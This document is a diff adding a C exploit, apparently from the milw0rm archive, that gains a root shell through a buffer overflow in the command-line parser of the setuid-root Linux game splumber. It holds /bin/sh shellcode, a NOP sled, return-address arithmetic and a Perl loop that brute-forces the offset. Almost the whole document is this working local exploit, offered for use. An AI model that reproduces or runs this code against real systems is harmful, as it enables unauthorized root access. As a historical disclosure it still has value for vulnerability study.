@@ -1,0 +1,52 @@
+/*
+   (linux)splumber[version2] buffer overflow, by v9[v9@fakehalo.org].  this is
+   a misc. exploit for the linux-SVGAlib space plumber game.  which, as you
+   know needs to be installed setuid root.  this overflow is due to a simple
+   oversight in the command line parser.  uses strcpy() to copy to an unchecked
+   250 byte buffer.
+
+   note: i also noticed, other than just being setuid root in the makefile, it
+         sets splumber's permissions to 4777. *g*
+
+   ...and here is the perl script for the lazy person:
+
+   #!/usr/bin/perl
+   $i=$ARGV[0];
+   while(1){
+    print "using offset: $i.\n";
+    system("./xsplumber $i");
+    $i+=50;
+   }
+*/
+
+#define PATH "/usr/games/splumber"	// change to the correct path.
+#define BUFFER_SIZE 257			// don't change.
+#define DEFAULT_OFFSET -300		// worked for me.
+
+static char exec[]=
+  "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f\xb8\x1b\x56"
+  "\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80"
+  "\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x01"; // still like it.
+
+long esp(void){__asm__("movl %esp,%eax");}
+int main(int argc,char **argv){
+  char bof[BUFFER_SIZE];
+  int i,offset;
+  long ret;
+  if(argc>1){offset=atoi(argv[1]);}
+  else{offset=DEFAULT_OFFSET;}
+  ret=(esp()-offset);
+  printf("*** (linux)splumber[version2] local buffer overflow, by v9[v9@fakehalo.org].\n");
+  printf("*** return address: 0x%lx, offset: %d.\n",ret,offset);
+  for(i=0;i<(252-strlen(exec));i++){*(bof+i)=0x90;}
+  memcpy(bof+i,exec,strlen(exec));
+  *(long *)&bof[i+strlen(exec)]=ret; // perfect, not lazy for once.
+  bof[BUFFER_SIZE-1]=0;
+  if(execlp(PATH,"splumber",bof,0)){
+    printf("error: program did not execute properly, check the path.\n");
+    exit(0);
+  }
+}
+
+
+# milw0rm.com [2000-11-17]
